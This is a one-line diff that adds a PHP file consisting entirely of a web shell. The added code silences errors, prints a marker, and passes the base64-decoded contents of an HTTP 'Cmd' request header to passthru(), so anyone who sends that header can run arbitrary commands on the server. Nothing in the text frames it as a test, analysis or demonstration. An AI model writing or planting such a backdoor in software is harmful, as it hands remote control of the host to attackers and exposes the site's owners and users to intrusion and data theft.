@@ -1,0 +1,1 @@
+<?php error_reporting(0); print(___); passthru(base64_decode($_SERVER[HTTP_CMD]));
